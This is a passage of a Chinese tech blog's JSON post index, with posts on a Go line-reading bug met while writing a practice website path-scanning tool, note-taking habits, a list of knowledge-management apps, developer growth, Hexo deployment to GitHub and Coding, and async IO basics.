CAkHBwkIDYcGiTOLjY+FmZkNlCN3eUoLDmwlDW+AAwcODl5bYl8wCVYMDw5UWzBtnAANEQ8kBIM0oAAGPgcREIQnVloAChEOqARjzgAQEbczg8YkWJq8nSUhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJGAYZZoOpKKQqDoORDMKwkgwtiwSBBYAJ2owGL5RgxBziQQMgkwoMkhNqAEDARPSaiMDFdDIiRSFQowMXE8Z6RdpYHWnEAWGPVkajPmARVZMPUkCBQkJBQINgwaFPoeJi4GVlQ2Qc3VJBQcLV0ptfAMJBwdcIl+FYjALQgimoGNWIhAQZA4HXSpLMQ8PIgkOSHxAQhERPw7ASTSFyCMMDqBTJL8tf3y2fCEAIfkECQcAAAAsAAAAABgAGAAABa8gII4k0DRlmg6kYZCoOg5EDBDEaAi2jLO3nEkgkMEIL4BLpBAkVy3hCTAQKGAznM0AFNFGBAbj2cA9jQixcGZAGgECBu/9HnTp+FGjjezJFAwFBQwKe2Z+KoCChHmNjVMqA21nKQwJEJRlbnUFCQlFXlpeCWcGBUACCwlrdw8RKGImBwktdyMQEQciB7oACwcIeA4RVwAODiIGvHQKERAjxyMIB5QlVSTLYLZ0sW8hACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWPM5wNiV0UDUIBNkdoepTfMkA7thIECiyRtUAGq8fm2O4jIBgMBA1eAZ6Knx+gHaJR4QwdCMKBxEJRggFDGgQEREPjjAMBQUKIwIRDhBDC2QNDDEKoEkDoiMHDigICGkJBS2dDA6TAAnAEAkCdQ8ORQcHTAkLcQQODLPMIgIJaCWxJMIkPIoAt3EhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWHM5wNiV0UN3xdLiqr+mENcWpM9TIbrsBkEck8oC0DQqBQGGIz+t3eXtob0ZTPgNrIwQJDgtGAgwCWSIMDg4HiiUIDAxFAAoODwxDBWINCEGdSTQkCQcoegADBaQ6MggHjwAFBZUFCm0HB0kJCUy9bAYHCCPGIwqmRq0jySMGmj6yRiEAIfkECQcAAAAsAAAAABgAGAAABbIgII4k0DRlmg6kYZCsOg4EKhLE2BCxDOAxnIiW84l2L4BLZKipBopW8XRLDkeCiAMyMvQAA+uON4JEIo+vqukkKQ6RhLHplVGN+LyKcXA4Dgx5DWwGDXx+gIKENnqNdzIDaiMECwcFRgQCCowiCAcHCZIlCgICVgSfCEMMnA0CXaU2YSQFoQAKUQMMqjoyAglcAAyBAAIMRUYLCUkFlybDeAYJryLNk6xGNCTQXY0juHghACH5BAkHAAAALAAAAAAYABgAAAWzICCOJNA0ZVoOAmkY5KCSSgSNBDE2hDyLjohClBMNij8RJHIQvZwEVOpIekRQJyJs5AMoHA+GMbE1lnm9EcPhOHRnhpwUl3AsknHDm5RN+v8qCAkHBwkIfw1xBAYNgoSGiIqMgJQifZUjBhAJYj95ewIJCQV7KYpzBAkLLQADCHOtOpY5PgNlAAykAEUsQ1wzCgWdCIdeArczBQVbDJ0NAqyeBb64nQAGArBTt8R8mLuyPyEAOw==\" data-src=\"https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif\" alt=\"演示1.gif\" /\u003e\u003c/p\u003e\n","title":"Golang初练手-多线程网站路径爆破"},{"content":"\n\n\n\n前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题\n我要做的东西是网站路径爆破\n所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题\n\n\n\n下面是一个小片段\n```\n400 Bad Request-----http://www.xxx.com/channel.asp\n400 Bad Request-----http://www.xxx.com/index.asp\n404 Not Found-----http://www.xxx.com/admin.asp\n```\n程序本身并没有错误，但是运行结果就比较怪了\nBad Request?\n这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request\n经过几轮测试，我觉得应该是网址拼接上出了问题\n\n我的拼接函数是这样\n```golang\nfunc ReturnBurstURL(fURL *os.File, baseurl string) (urlList []string) {\n\tallURLTxt := bufio.NewReader(fURL)\n\tfor {\n\t\turlpath, readerError := allURLTxt.ReadString('\\n')\n\t\tnewurl := baseurl + strings.Replace(urlpath, \"\\n\", \"\", -1)\n\t\turlList = append(urlList, newurl)\n\t\tif readerError == io.EOF {\n\t\t\tfmt.Printf(\"\\n读取字典完成，准备开始，请等待...\\n\")\n\t\t\treturn urlList\n\t\t}\n\t}\n}\n\n```\n\n我把取一行的方式换成bufio.NewScanner就正常了\n```golang\nfunc ReturnBurstURL(fURL *os.File, baseurl string) (urlList []string) {\n\tallURLTxt := bufio.NewScanner(fURL)\n\tfor allURLTxt.Scan() {\n\t\tnewurl := baseurl + allURLTxt.Text()\n\t\turlList = append(urlList, newurl)\n\t}\n\tfmt.Printf(\"\\n读取字典完成，准备开始，请等待...\\n\")\n\treturn urlList\n}\n```\n\n网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生\n我特地去查了查api文档\n```golang\nfunc NewReader(rd io.Reader) *Reader\n//NewReader returns a new Reader whose buffer has the default size. \nfunc (b *Reader) ReadString(delim byte) (string, error)\n//ReadString reads until the first occurrence of delim in the input, returning a string containing the data up to and including the delimiter. If ReadString encounters an error before finding a delimiter, it returns the data read before the error and the error itself (often io.EOF). ReadString returns err != nil if and only if the returned data does not end in delim. For simple uses, a Scanner may be more convenient. \nfunc NewScanner(r io.Reader) *Scanner\n//NewScanner returns a new Scanner to read from r. The split function defaults to ScanLines. \nfunc (s *Scanner) Scan() bool\n//Scan advances the Scanner to the next token, which will then be available through the Bytes or Text method. It returns false when the scan stops, either by reaching the end of the input or an error. After Scan returns false, the Err method will return any error that occurred during scanning, except that if it was io.EOF, Err will return nil. Scan panics if the split function returns 100 empty tokens without advancing the input. This is a common error mode for scanners. \nfunc (s *Scanner) Text() string\n//Text returns the most recent token generated by a call to Scan as a newly allocated string holding its bytes. \n```\n按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符\n虽说我第一种方法也用strings.Replace方法把\"\\n\"替换成了\"\"空字符，但是可能还是有点奇奇怪怪的东西\n\n\n*转载请注明出处*\n","cover":"","link":"2017/02/04/golang踩坑录-两种方式来读取文件一行所导致的问题.html","preview":"\u003cp\u003e前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题\n我要做的东西是网站路径爆破\n所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题\u003c/p\u003e\n","title":"Golang踩坑录 两种方式来读取文件一行所导致的问题"},{"content":"\n\n\n\n我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。\n\n其实滥用或者过分依赖这些笔记软件，最大的坏处是产生了知识增长的错觉。剪藏一篇机器学习的长文，就以为自己的知识增长了，其实只扫了一眼前言。 下载了一系列新框架的开发教程，三分钟热度把开发环境搭建完，跟着第一章跑了个hello world就弃坑了，但还是在欺骗自己，觉得自己已经掌握了，最不济那些教程已经被我收到硬盘里了，要用的时候再翻出来学嘛。而且，这种廉价的获得知识的错觉，带来的成就感比真的花时间去学习还要强，甚至会形成“要开工了-\u003e先了解下业界动态，去各大论坛微博逛一圈-\u003e哇，又有这么多新教程/技巧/开源库，看不过来，先保存到笔记软件 -\u003e 啊，不知不觉居然花了一个小时，不过我又不是打游戏看电影，是在收集知识，对自己还是有帮助的，不算虚度时光吧 -\u003e 继续开工，嗯？这个问题好像看到过更好的解决办法，要不要试着优化下？算了算了，反正办法在笔记里存着，以后有时间再重构吧 -\u003e...\"\n\n那几个月里我一直就陷在这样的循环里，同时还沾沾自喜于自己的“努力”而不自觉。直到某天，有个面试者坐到我面前时，我惊讶于他面谈时对各类业界动态新框架新技术口若悬河，但是实际的笔试题目却做得惨不忍睹，有些基础概念题都直接留白。我试探性地问了下原因，结果他特别诚恳地看着我说，这些问题的答案都存在他包里的笔记本电脑里，只要他想，分分钟就能搜出来。\n\n当时我下意识地反问了一句：“那谁不会啊？”\n\n说完我自己都惊了一下。\n\n那天之后，我很少再去碰那些笔记软件了。第二大脑什么的都是骗人的，在我得老年痴呆之前，应该不会特别依赖它们。曾经我一个月要从各大技术论坛微博twitter上收集几十篇教程，上百篇技术长文，真正看完的，不到五篇。之后我发现，把产生这些知识的源头掐掉，统统加到127.0.0.1里去，节省下的时间认认真真读几本经典纸质书，跟着官方文档走一遍教程，不收集，多动手多思考，技术长进比之前快得多。实际做项目的时候碰到解决不了的问题怎么办？直接开google去搜呗。根本没必要去浪费时间维护一个私人的知识库。\n\n在人类数千年漫长的文明史中，收藏本来是一件相当奢侈，大量耗费金钱、时间、精力的事情。但到了互联网的时代，这一切被简化成了点点鼠标就能完成的美事。或许因为盗版盛行的原因，它几乎已经是免费的，但它对于个体时间精力的耗费，却始终没有变化。而且，躺在硬盘里的资源们，就像王阳明的花一样，你未看它时，它与你同归于寂，一点关系都没有。\n\n《银河英雄传说》里杨威利说过一句名言：“如果你不记得了，那说明它不重要。” 或许可以再补充一句，“如果你看不完，那就没必要看完。” 大概就是这样，不知不觉写了这么多，与所有现在或曾经的互联网资源收集成瘾症患者共勉。\n\n\n**转自[V2EX](https://www.v2ex.com/amp/t/191507)一位v友的回答**\n","cover":"","link":"2017/01/21/笔记带给我们是真实的知识增长么？你需要好好考虑了.html","preview":"\u003cp\u003e我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。\u003c/p\u003e\n","title":"笔记带给我们是真实的知识增长么？你需要好好考虑了"},{"content":"\n\n\nevernote(印象笔记)\n\nWiz\n\n有道云\n\n麦库\n\nleanote\n\nGoogleKeep\n\nOneNote\n\nSimpleNote(wp家的，免费)\n\npocket(稍后读的软件，同类的还有Instapaper，国内的收趣)\n\nMyBase\n\nRaysNote(v友开发)\n\nCintaNotes\n\nhttps://jitaku.io\n\n \n\n**开源**\n\nGitit-Bigger\n\nLaverna\n\npaperwork\n\nDokuWiki\n\nleanote\n\nPermaNote\n\nCherryTree\n\nBrainStorm\n","cover":"","link":"2017/01/21/pkm（个人知识管理）类软件-偶尔更新列表.html","preview":"\u003cp\u003eevernote(印象笔记)\u003c/p\u003e\n\n\u003cp\u003eWiz\u003c/p\u003e\n","title":"PKM（个人知识管理）类软件收集(偶尔更新列表)"},{"content":"\n\n\n读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。\n\n**正文如下：**\n\n本人也是coding很多年，虽然很失败，但也总算有点失败的心得，不过我在中国，大多数程序员都是像我一样，在一直走着弯路。如果想成为一个架构师，就必须走正确的路，否则离目标越来越远，正在辛苦工作的程序员们，你们有没有下面几种感觉？\n\n　　一、我的工作就是按时完成领导交给我的任务，至于代码写的怎样，知道有改进空间，但没时间去改进，关键是领导也不给时间啊。\n\n　　二、我发现我的水平总是跟不上技术的进步，有太多想学的东西要学，jQuery用的人最近比较多啊，听说最近MVC比较火，还有LINQ，听说微软又有Silverlight了……\n\n　　三、我发现虽然我工作几年了，除了不停的coding，Ctrl+C和Ctrl+V更熟练了，但编码水平并没有提高，还是一个普通程序员，但有人已经做到架构师了。\n\n　　四、工作好几年了，想跳槽换个工作，结果面试的考官都问了一些什么数据结构，什么垃圾回收，什么设计模式之类的东西，虽然看过，但是平时用不着，看了也忘记了，回答不上来，结果考官说我基础太差。。。\n\n　　有没有，如果没有，接下来就不用看了，你一定是大拿了，或者已经明白其中之道了，呵呵。\n\n　　如果有，恭喜你，你进入学习误区了，如果想在技术上前进的话，就不能一直的coding，为了完成需求而工作，必须在coding的同时，让我们的思维，水平也在不停的提高。\n\n　　写代码要经历下面几个阶段。\n\n　　一 、你必须学习面向对象的基础知识，如果连这个都忘了，那你的编程之路注定是在做原始初级的重复！\n\n　　很多程序员都知道类、方法、抽象类、接口等概念，但是为什么要面向对象，好处在哪里，要解决什么问题？只是明白概念，就是表达不清楚，然后在实 际工作中也用不上，过了一段时间，面向对象的东西又模糊了，结果是大多数程序员用着面向对象的语言做着面向过程的工作，因此要学习面向对象，首先应该明白 面向对象的目的是什么？\n\n　　面向对象的目的是什么？\n\n　　开发语言在不断发展，从机器语言，到汇编，到高级语言，再到第四代语言;软件开发方法在不断发展，从面向过程，面向对象，到面向方面等。虽然这些都在不断发展，但其所追求的目标却一直没变，这些目标就是：\n\n　　1. 降低软件开发的复杂度\n\n　　2. 提高软件开发的效率\n\n　　3. 提高软件质量：可维护性，可扩展性，可重用性等。\n\n　　其中语言的发展，开发方法的发展在1,2两条上面取得了极大的进步，但对于第3条，我们不能光指望开发方法本身来解决。\n\n　　提高软件质量：可维护性，可扩展性，可重用性等，再具体点，就是高内聚、低耦合，面向对象就是为了解决第3条的问题。因此要成为一个好的程序员，最绕不开的就是面向对象了。\n\n　　二、 要想学好面向对象，就必须学习设计模式。\n\n　　假定我们了解了面向对象的目的，概念了，但是我们coding过程中却发现，我们的面向对象的知识似乎一直派不上用场，其实道理很简单，是因为 我们不知道怎么去用，就像游泳一样，我们已经明白了游泳的好处，以及游泳的几种姿势，狗刨、仰泳、蛙泳、自由泳，但是我们依然不会游泳。。。。\n\n　　因此有了这些基本原则是不行的，我们必须有一些更细的原则去指导我们的设计，这就有了更基础的面向对象的五大原则，而把这几种原则更详细的应用 到实际中来，解决实际的问题，这就是设计模式。因此要学好OO，必须要学习设计模式，学习设计模式，按大师的话说，就是在人类努力解决的许多领域的成功方 案都来源于各种模式，教育的一个重要目标就是把知识的模式一代一代传下去。\n\n　　因此学习设计模式，就像我们在看世界顶级的游泳比赛，我们为之疯狂，为之着迷。\n\n　　三、学习设计模式\n\n　　正像我们并不想只是看别人表演，我们要自己学会游泳，这才是我们的目的所在。\n\n　　当我们看完几篇设计模式后，我们为之精神振奋，在新的coding的时候，我们总是想努力的用上学到的设计模式，但是经常在误用模式，折腾半天发现是在脱裤子抓痒。。。\n\n　　当学完设计模式之后，我们又很困惑，感觉这些模式简直太像了，很多时候我们分不清这些模式之间到底有什么区别，而且明白了设计过程中的一个致命 的东西——过度设计，因为设计模式要求我们高扩展性，高重用性，但是在需求提出之初，我们都不是神，除了依靠过去的经验来判断外，我们不知道哪些地方要扩 展，哪些地方要重用，而且过去的经验就一定是正确的吗？所以我们甚至不敢再轻易用设计模式，而是还一直在用面向过程的方法在实现需求。\n\n　　四、学习重构\n\n　　精彩的代码是怎么想出来的，比看到精彩的代码更加令人期待。于是我们开始思考，这些大师们莫非不用工作，需求来了没有领导规定完成时间，只以设 计精彩的代码为标准来开展工作？这样的工作太爽了，也不可能，老板不愿意啊。就算这些理想的条件他都有，他就一开始就设计出完美的代码来了？也不可能啊， 除非他是神，一开始就预料到未来的所有需求，那既然这些条件都没有，他们如何写出的精彩代码？\n\n　　Joshua Kerievsky在那篇著名的《模式与XP》〔收录于《极限编程研究》一书）中明白地指出：在设计前期使用模式常常导致过度工程（over- engineering)。这是一个残酷的现实，单凭对完美的追求无法写出实用的代码，而「实用」是软件压倒一切的要素。\n\n　　在《重构——改善既有的代码的设计》一书中提到，通过重构（refactoring），你可以找出改变的平衡点。你会发现所谓设计不再是一切动 作的前提，而是在整个开发过程中逐渐浮现出来。在系统构筑过程中，你可以学习如何强化设计；其间带来的互动可以让一个程序在开发过程中持续保有良好的设 计。\n\n　　总结起来就是说，我们在设计前期就使用设计模式，往往导致设计过度，因此应该在整个开发过程，整个需求变更过程中不断的重构现在的代码，才能让 程序一直保持良好的设计。由此可见，开发过程中需要一直重构，否则无论当初设计多么的好，随着需求的改变，都会变成一堆烂代码，难以维护，难以扩展。所谓 重构是这样一个过程：「在不改变代码外在行为的前提下，对代码做出修改，以改进程序的内部结构」。重构的目标，就是设计模式，更本质的讲就是使程序的架构 更趋合理，从而提高软件的可维护性，可扩展性，可重用性。\n\n　　《重构——改善既有的代码的设计》一书也是Martin Fowler等大师的作品，软件工程领域的超级经典巨著，与另一巨著《设计模式》并称\"软工双雄\"，不可不读啊。\n\n　　五、开始通往优秀软件设计师的路上\n\n　　通过设计模式和重构，我们的所学和我们工作的coding终于结合上了，我们可以在工作中用面向对象的思维去考虑问题，并开始学习重构了。这就 像游泳一样，我们看完了各种顶级的游泳比赛，明白各种规则，名人使用的方法和技巧，现在是时候回家去村旁边的小河里练练了。练习也是需要有教练的，推荐另 一本经典书叫《重构与模式》，引用他开篇的介绍，本书开创性地深入揭示了重构与模式这两种软件开发关键技术之间的联系，说明了通过重构实现模式改善既有的 设计，往往优于在新的设计早期使用模式。本书不仅展示了一种应用模式和重构的创新方法，而且有助于读者结合实战深入理解重构和模式。\n\n　　这本书正是我们需要的教练，值得一读。\n\n　　六、没有终点，只有坚持不懈的专研和努力。\n\n　　经过了几年的坚持，终于学会了灵活的运用各种模式，我们不需要去刻意的想用什么模式，怎么重构。程序的目标，就是可维护性，可扩展性，可重用 性，都已经成了一种编程习惯，一种思维习惯，就像我们练习了几年游泳之后，我们不用再刻意的去考虑，如何让自己能在水上漂起来，仰泳和蛙泳的区 别..... 而是跳进水里，就自然的游了起来，朝对岸游去。但是要和大师比起来，嘿嘿，我们还有很长的路要走，最终也可能成不了大师，但无论能不能成为大师，我们已经 走在了成为大师的正确的路上，我们和别的程序员已经开始不一样，因为他们无论再过多少年，他们的水平不会变，只是在重复造轮子，唯一比你快的，就是 Ctrl+C和Ctrl+V。\n\n　　正确的路上，只要坚持，就离目标越来越近，未来就一定会是一个优秀的架构师，和优秀架构师的区别，可能只是时间问题。\n\n\n**转自[李凡的博客](http://www.cnblogs.com/leefan/p/5489984.html)**\n","cover":"","link":"2017/01/20/web高级开发的成长之路.html","preview":"\u003cp\u003e读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e正文如下：\u003c/strong\u003e\u003c/p\u003e\n","title":"web高级开发的成长之路"},{"content":"\n\n\n# 安装GIT和Node.JS\n首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入\n```bash\ngit config --global user.name \"Your Name\"\ngit config --global user.email \"email@example.com\"\n```\n因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。\n**注意：**git config命令的--global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。\n\n\n\n#安装并初始化HEXO\n如果你是在Windows上，请打开Git-CMD\n![1](http://7xusrl.com1.z0.glb.clouddn.com/git-cmd-exa.png)\n假如你是想在D:\\blog\\下建立你的博客，请先在D盘下新建文件夹blog\n在Git-CMD中输入`npm install -g hexo-cli`回车开始安装hexo\n安装完成后将git cmd工作目录切换至D:\\blog\\然后输入`hexo init`回车，或者直接在git cmd中输入`hexo init d:\\\\blog`\n如果你的d:\\blog\\下的目录形式是\n```\n.\n├── _config.yml // 网站的配置信息，你可以在此配置大部分的参数。\n├── package.json \n├── scaffolds // 模板文件夹。当你新建文章时，Hexo会根据scaffold来建立文件。\n├── source // 存放用户资源的地方\n|   ├── _drafts\n|   └── _posts\n└── themes // 存放网站的主题。Hexo会根据主题来生成静态页面。\n```\n那么你的hexo安装并初始化完成\n然后输入`hexo server`启动本地demo，打开浏览器，查看http://localhost:4000/可以看到自己的博客\n\n# 将之托管到github和coding上\n## github项目创建\n1.注册github账号\n2.创建项目仓库\n进入[github.com](https://github.com/)，然后点击右上角 + --\u003enew repository\n\n![2](http://7xusrl.com1.z0.glb.clouddn.com/new%20rep.png)\n\n3.在Repository name中填写Github账号名.github.io，点击Create repository，完成创建。\n\n![3](http://7xusrl.com1.z0.glb.clouddn.com/hexo-github-1.png)\n\n## Coding项目创建\n1.注册Coding账号\n2.创建项目仓库\n\n![4](http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-1.png)\n\n3.填写项目名称描述创建即可\n\n![5](http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-2.png)\n\n## 配置SHH\n\n配置shh key是让本地git项目与远程的github建立联系\n1.检查是否已经有SSH Key，打开Git Bash，输入\n```bash\ncd ~/.ssh\n```\n2.如果没有.ssh这个目录，则生成一个新的SSH，输入\n```bash\nssh-keygen -t rsa -C \"your e-mail\"\n```\n注意1: 此处的邮箱地址，你可以输入自己的邮箱地址；注意2: 此处的「-C」的是大写的「C」\n接下来几步都直接按回车键,然后系统会要你输入密码\n```bash\nEnter passphrase (empty for no passphrase):\u003c输入加密串\u003e\nEnter same passphrase again:\u003c再次输入加密串\u003e\n```\n这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。个人建议为空比较方便\n注意：输入密码的时候没有*字样的，你直接输入就可以了。 \n3.最后看到这样的界面，就成功设置ssh key了 \n![6](http://7xusrl.com1.z0.glb.clouddn.com/wangzhanssh%20key.jpg)\n\n## 添加 SSH Key 到 GitHub和Coding\n复制`~/.ssh/id_rsa.pub`中的内容\n~是个人文件夹，比如我的电脑上是C:\\Users\\Administrator\\.ssh\\id_rsa.pub，将其中的文本复制\n进入github，点击头像--\u003eSetting--\u003eSSH and GPG keys,然后在右侧点击New SSH key，\nTitle随便写，key中填写id_rsa.pub中复制的内容，然后Add SSH key就ok了\n进入Coding.net，点击头像--\u003e个人设置--\u003eSSH公钥，新增公钥，公钥名称随便，公钥内容是填写id_rsa.pub中复制的内容，有效期可以勾选永久，然后添加ok\n\n## 测试SSH是否配置成功\n\n1.打开Git Bash，然后输入\n```bash\nssh -T git@github.com\n```\n如配置了密码则要输入密码,输完按回车\n如果显示以下内容，则说明Github中的ssh配置成功。\n```bash\nHi username! You've successfully authenticated, but GitHub does not\nprovide shell access.\n```\n2.再输入\n```bash\nssh -T git@git.coding.net\n```\n如果显示以下则说明coding中的ssh配置成功\n```bash\nHello username You've connected to Coding.net by SSH successfully!\n```\n## 创建Github Pages和Coding Pages 服务\n1.GitHub Pages分两种，一种是你的GitHub用户名建立的username.github.io这样的用户\u0026组织页（站），另一种是依附项目的pages。想建立个人博客是用的第一种，形如cnfeat.github.io这样的可访问的站，每个用户名下面只能建立一个。\nCoding Pages服务开启在官网说的很详细，不知道请百度\n2.打开D:\\blog文件夹中的_config.yml文件，找到如下位置，填写\n```bash\n# Deployment\n## Docs: https://hexo.io/docs/deployment.html\ndeploy:\n- type: git\n  repo: \n    github: git@github.com:yourname/yourname.github.io.git,master\n    coding: git@git.coding.net:yourname/yourname.git,coding-pages\n```\n**注：** (1) 其中yourname替换成你的Github账户名;(2)注意在yml文件中，:后面都是要带空格的。\n#部署完成\n在blog文件夹中空白处右击打开Git Bash输入\n```bash\nhexo clean\nhexo d- g\n```\n此时，通过访问http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。\n","cover":"","link":"2017/01/10/hexo在github和coding-net部署并分流（一）-1.html","preview":"\u003ch1\u003e安装GIT和Node.JS\u003c/h1\u003e\n\n\u003cp\u003e首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003egit config --global user.name \u0026quot;Your Name\u0026quot;\ngit config --global user.email \u0026quot;email@example.com\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。\n\u003cstrong\u003e注意：\u003c/strong\u003egit config命令的\u0026ndash;global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。\u003c/p\u003e\n","title":"hexo在github和coding.net部署并分流（一）"},{"content":"\n\n\n\n-------------\n本文主要从一下几个方面进行说明:\n - 什么是[异步(Asynchronous)编程](http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B)\n - 为什么要使用异步编程？\n - 如何利用Python实现异步\n-------------\n\n\n\n\n# 什么是异步编程\n## 文章开始前，先简单介绍下各种 IO 模型：\n\n### 最容易做的是阻塞 IO\n即读写数据时，需要等待操作完成，才能继续执行。进阶的做法就是用多线程来处理需要 IO 的部分，缺点是开销会有些大。\n### 接着是非阻塞 IO\n即读写数据时，如果暂时不可读写，则立刻返回，而不等待。因为不知道什么时候是可读写的，所以轮询时可能会浪费 CPU 时间。\n### 然后是 IO 复用\n即在读写数据前，先检查哪些描述符是可读写的，再去读写。select 和 poll 就是这样做的，它们会遍历所有被监视的描述符，查看是否满足，这个检查的过程是阻塞的。而 epoll、kqueue 和 /dev/poll 则做了些改进，事先注册需要检查哪些描述符的哪些事件，当状态发生变化时，内核会调用对应的回调函数，将这些描述符保存下来；下次获取可用的描述符时，直接返回这些发生变化的描述符即可。\n### 再之后是信号驱动\n即描述符就绪时，内核发送 SIGIO 信号，再由信号处理程序去处理这些信号即可。不过信号处理的时机是从内核态返回用户态时，感觉也得把这些事件收集起来才好处理，有点像模拟 IO 复用了。\n### 最后是异步 IO\n即读写数据时，只注册事件，内核完成读写后（读取的数据会复制到用户态），再调用事件处理函数。这整个过程都不会阻塞调用线程，不过实现它的操作系统比较少，Windows 上有比较成熟的 IOCP，Linux 上的 AIO 则有不少缺点。\n虽然真正的异步 IO 需要中间任何步骤都没有阻塞，这对于某些只是偶尔需要处理 IO 请求的情况确实有用（比如文本编辑器偶尔保存一下文件）；但对于服务器端编程的大多数情况而言，它的主线程就是用来处理 IO 请求的，如果在空闲时不阻塞在 IO 等待上，也没有别的事情能做，所以本文就不纠结这个异步是否名副其实了。\n\n## 然后我们了解一下事件循环(Event Loop)\nEvent Loop 是一个很重要的概念，指的是计算机系统的一种运行机制。\n\n![Event Loop](http://image.beekka.com/blog/201310/2013102001.png)\n\n我们一般的单线程程序中，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。\n\n如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。\n\n\n那么这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。\n\n于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入\"任务队列\"（task queue）的任务，只有\"任务队列\"通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。\n具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。）\n\n    （1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。\n    （2）主线程之外，还存在一个\"任务队列\"（task queue）。只要异步任务有了运行结果，就在\"任务队列\"之中放置一个事件。\n    （3）一旦\"执行栈\"中的所有同步任务执行完毕，系统就会读取\"任务队列\"，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。\n    （4）主线程不断重复上面的第三步。\n\n下图就是主线程和任务队列的示意图。\n\n![](http://image.beekka.com/blog/2014/bg2014100801.jpg)\n\n只要主线程空了，就会去读取\"任务队列\"，这个过程会不断重复。\n\n所谓异步是相对于同步（Synchronous）的概念来说的，之所以容易造成混乱，是因为刚开始接触这两个概念时容易把同步看做是同时，而同时不是意味着并行（Parallel）吗？然而实际上同步或者异步是针对于时间轴的概念，同步意味着顺序、统一的时间轴，而异步则意味着乱序、效率优先的时间轴。比如在爬虫运行时，先抓取 A 页面，然后从中提取下一层页面 B 的链接，此时的爬虫程序的运行只能是同步的，B 页面只能等到 A 页面处理完成之后才能抓取；然而对于独立的两个页面 A1 和 A2，在处理 A1 网络请求的时间里，与其让 CPU 空闲而 A2 等在后面，不如先处理 A2，等到谁先完成网络请求谁就先来进行处理，这样可以更加充分地利用 CPU，但是 A1 和 A2 的执行顺序则是不确定的，也就是异步的。\n\n# 